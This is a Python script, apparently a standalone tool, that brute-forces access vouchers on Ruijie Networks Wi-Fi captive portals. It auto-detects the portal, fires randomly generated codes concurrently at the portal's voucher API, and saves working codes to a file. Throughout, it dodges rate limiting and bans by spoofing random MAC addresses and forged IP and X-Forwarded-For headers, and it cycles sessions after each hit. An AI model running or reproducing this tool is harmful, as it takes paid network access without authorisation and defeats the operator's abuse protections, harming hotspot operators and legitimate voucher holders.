#!/usr/bin/env python3
"""
Ruijie Voucher Scanner v15.0 - Mix/Eng Optimized & Fast Speed
- Concurrency: 10 (Max Speed)
- Instant Refresh on Hit
- Optimized Random Generation for Mix/Eng
"""

import os
import sys
import json
import asyncio
import aiohttp
import re
import time
import socket
import requests
import urllib3
import subprocess
import random
import string
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin, quote

from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.box import ROUNDED

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RL_SLEEP = 0.1
CONCURRENCY = 10   # ပိုမြန်အောင် ၁၀ ခု တွဲစစ်မယ်
console = Console()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    console.print(Panel(
        Align.center(
            Text("RUIJIE SCANNER v15.0", style="bold magenta") + "\n" +
            Text("Mix/Eng Optimized | Dragon", style="bold yellow")
        ), 
        border_style="cyan", 
        box=ROUNDED
    ))
    console.print()

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except:
        return "192.168.110.1"

def extract_params_from_url(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    params = {}
    mapping = {
        'gw_id': 'gw_id', 'gw_sn': 'gw_sn', 'gw_address': 'gw_address',
        'gw_port': 'gw_port', 'ip': 'ip', 'mac': 'mac', 'slot_num': 'slot_num',
        'nasip': 'nasip', 'ssid': 'ssid', 'url': 'url', 'chap_id': 'chap_id',
        'chap_challenge': 'chap_challenge'
    }
    for key, mk in mapping.items():
        if key in query:
            params[mk] = query[key][0]
    if 'RES' in query:
        params['RES'] = query['RES'][0]
    return params

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def auto_detect_portal():
    console.print(Panel(
        Align.center(Text("AUTO DETECTING PORTAL URL...", style="bold cyan")),
        border_style="cyan", box=ROUNDED
    ))
    
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
    
    TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r = session.get(TEST_URL, allow_redirects=True, timeout=5)
        if "ruijienetworks" in r.url:
            console.print(f"[bold green][+][/bold green] Detected via Connectivity Check!")
            return r.url
    except:
        pass

    console.print("[yellow][*][/yellow] Checking Gateways...")
    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]
    gateways = list(dict.fromkeys(gateways))

    for gw in gateways:
        try:
            res = session.get(f"http://{gw}", timeout=5, allow_redirects=True)
            if "ruijienetworks" in res.url:
                console.print(f"[bold green][+][/bold green] Detected via Gateway ({gw})!")
                return res.url
        except:
            pass

    return None

class VoucherScanner:
    def __init__(self):
        self.sid = None
        self.sign = None
        self.timestamp = None
        self.session_valid = False
        self.rate_limited = False
        self.mode = "num"
        
        self.current_mac = self.gen_random_mac()
        self.current_ip = f"192.168.110.{random.randint(2, 254)}"

        self._display_active = False
        self._live = None
        self._state = {
            'phase': '', 'conc': CONCURRENCY, 'batch': 1,
            'total': 0, 'checked': 0, 'speed': 0, 'percentage': 0,
            'found': [], 'valid': [], 'sta': [], 'expired': [], 'captcha': [], 'rl': [],
            'status': None, 'session': None, 'current_code': ''
        }

        self.params = {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": self.current_ip,
            "mac": self.current_mac, "slot_num": "14", "nasip": "192.168.1.193",
            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
            "url": "http://connectivitycheck.gstatic.com/generate_204",
            "chap_id": r"\245", "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
        }

    def apply_params_from_url(self, url):
        params = extract_params_from_url(url)
        for key, value in params.items():
            if key in self.params:
                self.params[key] = value
        self.params['mac'] = self.current_mac
        self.params['ip'] = self.current_ip

    def print_progress_bar(self, percentage, width=30):
        filled = int(width * percentage / 100)
        return '#' * filled + '-' * (width - filled)

    def gen_random_mac(self):
        mac = [0x00, 0x16, 0x3e,
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    def generate_voucher(self, length):
        if self.mode == "num":
            return str(random.randint(0, 10**length - 1)).zfill(length)
        elif self.mode == "eng":
            return ''.join(random.choices(string.ascii_lowercase, k=length))
        elif self.mode == "mix":
            # Mix အတွက် ပိုမြန်အောင် နည်းလမ်းပြောင်းထားတယ်
            return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        return str(random.randint(0, 10**length - 1)).zfill(length)

    def make_layout(self):
        s = self._state
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=4),
            Layout(name="live", size=3),
            Layout(name="logs", ratio=1),
            Layout(name="hits", ratio=1),
        )

        title = Text("RUIJIE SCANNER v15.0 - MIX/ENG FAST", style="bold magenta", justify="center")
        sub = Text(f"MAC: {self.current_mac[-8:]} | IP: {self.current_ip[-3:]}", style="bold yellow", justify="center")
        layout["header"].update(Panel(Align.center(Text.assemble(title, "\n", sub)), border_style="cyan", box=ROUNDED))

        if s['status']: status_text = Text(s['status'], style="bold yellow")
        else: status_text = Text("Active", style="bold green")

        live_grid = Table.grid(padding=0, expand=True)
        live_grid.add_column(ratio=3)
        live_grid.add_column(ratio=2)
        live_grid.add_column(ratio=2)
        live_grid.add_column(ratio=2)
        live_grid.add_row(
            Panel(Align.center(Text(s['current_code'], style="bold green")), title="Code", border_style="green", box=ROUNDED),
            Panel(Align.center(Text(f"{s['checked']:,}/{s['total']:,}", style="bold cyan")), title="Checked", border_style="cyan", box=ROUNDED),
            Panel(Align.center(Text(f"{s['speed']:,}/min", style="bold yellow")), title="Speed", border_style="yellow", box=ROUNDED),
            Panel(Align.center(status_text), title="Status", border_style="magenta", box=ROUNDED),
        )
        layout["live"].update(live_grid)

        log_text = Text()
        log_text.append(f"Session: {s['session'][:15] if s['session'] else 'None'}...\n")
        log_text.append(f"Progress: [{self.print_progress_bar(s['percentage'])}] {s['percentage']:.2f}%\n")
        layout["logs"].update(Panel(log_text, title="Progress", border_style="blue", box=ROUNDED))

        hits_table = Table(show_header=True, header_style="bold magenta", expand=True, box=ROUNDED)
        hits_table.add_column("Type", width=8, justify="center")
        hits_table.add_column("Voucher", justify="center")
        
        for v in s['found']: hits_table.add_row("[bold green]FOUND[/bold green]", v)
        for v in s['valid']: hits_table.add_row("[green]VALID[/green]", v)
        if not s['found'] and not s['valid']: hits_table.add_row("", "[dim]No hits yet...[/dim]")

        layout["hits"].update(Panel(hits_table, title=f"Hits (F: {len(s['found'])} | V: {len(s['valid'])})", border_style="yellow", box=ROUNDED))
        return layout

    def _render(self):
        if not self._display_active: return
        try: self._live.update(self.make_layout())
        except: pass

    def _set_status(self, msg):
        if self._display_active:
            self._state['status'] = msg
            self._render()
        else:
            console.print(msg)

    def _clear_status(self):
        if self._display_active:
            self._state['status'] = None

    async def get_session_id(self, session, force_refresh=False):
        if not force_refresh and self.sid and self.session_valid:
            return self.sid

        base_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog"
        if "portal-mm-as" in str(self.params.get("url", "")):
            base_url = base_url.replace("portal-as", "portal-mm-as")

        attempt = 0
        while attempt < 5:
            attempt += 1
            
            if self.rate_limited or attempt > 2:
                self.current_mac = self.gen_random_mac()
                self.current_ip = f"192.168.110.{random.randint(2, 254)}"
                self.rate_limited = False
                self._set_status(f"New MAC: {self.current_mac[-8:]}")
            else:
                self._set_status(f"MAC: {self.current_mac[-8:]}")

            temp_params = self.params.copy()
            temp_params['mac'] = self.current_mac
            temp_params['ip'] = self.current_ip

            params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
            full_url = f"{base_url}?{params_str}"

            headers = {
                'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{self.current_mac}',
                'Client-Mac': self.current_mac,
                'X-Forwarded-For': self.current_ip,
                'Connection': 'close'
            }

            try:
                session.cookie_jar.clear()
                async with session.get(full_url, headers=headers, timeout=10, allow_redirects=False) as resp:
                    location = resp.headers.get('Location', '')
                    
                    if not location:
                        await asyncio.sleep(RL_SLEEP)
                        continue

                    loc_lower = location.lower()
                    if "request limited" in loc_lower or "error.html" in loc_lower or "errormsg" in loc_lower or "banned" in loc_lower:
                        self._set_status(f"Ban Detected! Spoofing new MAC...")
                        self.rate_limited = True
                        await asyncio.sleep(RL_SLEEP)
                        continue

                    query = parse_qs(urlparse(location).query)
                    sid = query.get('sessionId', [None])[0]
                    if sid:
                        self.sid = sid
                        self.sign = query.get('sign', [None])[0]
                        self.timestamp = query.get('timestamp', [None])[0]
                        self.session_valid = True
                        self._state['session'] = sid
                        self._clear_status()
                        self._render()
                        return sid
                    
                    await asyncio.sleep(RL_SLEEP)
            except Exception:
                await asyncio.sleep(RL_SLEEP)
        
        self._set_status("Failed SID. Retrying later...")
        await asyncio.sleep(1)
        return None

    async def validate_voucher(self, session, voucher, mode="scan"):
        if not await self.get_session_id(session, force_refresh=False):
            return 'RATE_LIMITED', None, "No session"

        url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
        if self.sign and self.timestamp:
            url += f"&sign={self.sign}&timestamp={self.timestamp}"

        headers = {
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 12)",
            "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={self.sid}",
        }

        for attempt in range(1, 4):
            payload = {"accessCode": voucher, "sessionId": self.sid, "apiVersion": 1}
            if self.sign: payload["sign"] = self.sign
            if self.timestamp: payload["timestamp"] = self.timestamp

            try:
                async with session.post(url, json=payload, headers=headers, ssl=False, timeout=10, allow_redirects=True) as resp:
                    text = await resp.text()
                    final_url = str(resp.url)

                    if "request%20limited" in final_url.lower() or "request limited" in final_url.lower():
                        self.session_valid = False
                        self.rate_limited = True
                        await asyncio.sleep(RL_SLEEP)
                        return 'RATE_LIMITED', None, "Request limited"

                    try: result = json.loads(text)
                    except: result = {}

                    message = str(result.get("message", ""))
                    msg_lower = message.lower()

                    if "request limited" in msg_lower or "too many" in msg_lower:
                        self.session_valid = False
                        self.rate_limited = True
                        await asyncio.sleep(RL_SLEEP)
                        return 'RATE_LIMITED', None, message

                    if "session timed out" in msg_lower or "invalid session" in msg_lower:
                        self.session_valid = False
                        await self.get_session_id(session, force_refresh=True)
                        continue

                    if "sta limit" in msg_lower: return 'STA_LIMIT', None, message
                    if "expired" in msg_lower: return 'EXPIRED', None, message
                    if "authentication failed" in msg_lower or "incorrect" in msg_lower: return 'INVALID', None, message

                    if result.get("success") is True and isinstance(result.get("result"), dict):
                        logon_url = result["result"].get("logonUrl")
                        return ('FOUND', logon_url, "Valid") if logon_url else ('VALID', None, "Valid")
                    
                    if '"result":0' in text or '"result": 0' in text or '"error":null' in text:
                        logon_url = result.get("result", {}).get("logonUrl") if isinstance(result.get("result"), dict) else None
                        return ('FOUND', logon_url, "Valid") if logon_url else ('VALID', None, "Valid")

                    return 'INVALID', None, message or "Unknown"
            except Exception:
                self.session_valid = False
                await asyncio.sleep(0.2)
        return 'INVALID', None, "Max retries"

    def save_found(self, voucher: str, status: str, logon_url: str = ""):
        ts = get_timestamp()
        with open("found_ruijie.txt", "a") as f:
            if status == "FOUND": f.write(f"[{ts}] {voucher} -> {logon_url}\n")
            elif status == "VALID": f.write(f"[{ts}] {voucher} -> VALID\n")

    async def run_phase(self, session, phase_name, total_codes, length, delay):
        self._state.update({
            'phase': phase_name, 'conc': CONCURRENCY, 'batch': 1,
            'total': total_codes, 'checked': 0, 'speed': 0, 'percentage': 0,
            'status': None, 'session': self.sid, 'current_code': '----'
        })
        self._display_active = True
        self._live = Live(self.make_layout(), refresh_per_second=10, screen=True)
        self._live.start()

        start_time = time.time()
        tested_count = 0
        
        semaphore = asyncio.Semaphore(CONCURRENCY)

        async def bounded_check(v):
            async with semaphore:
                res = await self.validate_voucher(session, v, mode="scan")
                if delay > 0:
                    await asyncio.sleep(delay)
                return v, res

        try:
            batch = []
            for _ in range(total_codes):
                voucher = self.generate_voucher(length)
                batch.append(voucher)

                if len(batch) >= CONCURRENCY:
                    tasks = [bounded_check(v) for v in batch]
                    results = await asyncio.gather(*tasks)
                    
                    for v, res in results:
                        tested_count += 1
                        status, logon_url, message = res
                        
                        if status == 'FOUND':
                            self._state['found'].append(v)
                            self.save_found(v, "FOUND", logon_url)
                            # Hit ရတာနဲ့ MAC/SID ချက်ချင်းပြောင်းမယ်
                            self.session_valid = False
                            self.current_mac = self.gen_random_mac()
                            self.current_ip = f"192.168.110.{random.randint(2, 254)}"
                            await self.get_session_id(session, force_refresh=True)
                        elif status == 'VALID':
                            self._state['valid'].append(v)
                            self.save_found(v, "VALID", "")
                            # Hit ရတာနဲ့ MAC/SID ချက်ချင်းပြောင်းမယ်
                            self.session_valid = False
                            self.current_mac = self.gen_random_mac()
                            self.current_ip = f"192.168.110.{random.randint(2, 254)}"
                            await self.get_session_id(session, force_refresh=True)
                        elif status == 'RATE_LIMITED':
                            self.rate_limited = True

                    self._state['current_code'] = batch[-1]
                    self._state['checked'] = tested_count
                    
                    elapsed = time.time() - start_time
                    self._state['speed'] = int(tested_count / elapsed * 60) if elapsed > 0 else 0
                    self._state['percentage'] = (tested_count / total_codes) * 100
                    
                    self._render()
                    batch.clear()

        finally:
            self._display_active = False
            self._live.stop()
            console.print(f"\n[bold green]COMPLETED: {phase_name}[/bold green]")

    async def run_cascading_scan(self, session, length):
        if length == 6: total_p1 = 100000
        elif length == 7: total_p1 = 500000
        else: total_p1 = 1000000

        console.print(f"[bold yellow][!][/bold yellow] Mode: {self.mode.upper()} - Max Speed Started\n")

        await self.run_phase(
            session, "Phase 1 (Max Speed)", 
            total_codes=total_p1, 
            length=length,
            delay=0.0 
        )

        console.print(Panel(Align.center(Text("SCAN COMPLETED! Check 'found_ruijie.txt'.", style="bold green")), border_style="cyan", box=ROUNDED))

async def main():
    show_banner()
    scanner = VoucherScanner()

    portal_url = auto_detect_portal()
    
    if portal_url:
        scanner.apply_params_from_url(portal_url)
        console.print(f"[bold green][+][/bold green] URL fetched successfully!")
    else:
        console.print("[bold red][-][/bold red] Auto-detect failed. Please paste URL manually.")
        url_input = input("[yellow]>> Paste URL: [/yellow]").strip()
        if not url_input:
            return
        scanner.apply_params_from_url(url_input)

    async with aiohttp.ClientSession() as session:
        console.print(Panel(
            Text("Choose Scan Type:\n  1. NUM (0-9)\n  2. ENG (a-z)\n  3. MIX (a-z + 0-9)", style="cyan"),
            border_style="cyan", box=ROUNDED
        ))
        scan_type = input("[yellow]>> [/yellow]").strip()
        
        if scan_type == "1": scanner.mode = "num"
        elif scan_type == "2": scanner.mode = "eng"
        elif scan_type == "3": scanner.mode = "mix"
        else: scanner.mode = "num"

        lc = input("[yellow]>> Voucher length (6/7/8) [6]: [/yellow]").strip()
        length = int(lc) if lc in ['7', '8'] else 6
        await scanner.run_cascading_scan(session, length)

    console.print(Panel(Align.center(Text("Done!", style="bold green")), border_style="cyan", box=ROUNDED))
    input("[blue][*][/blue] Press Enter to exit...")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Interrupted by user[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        import traceback
        traceback.print_exc()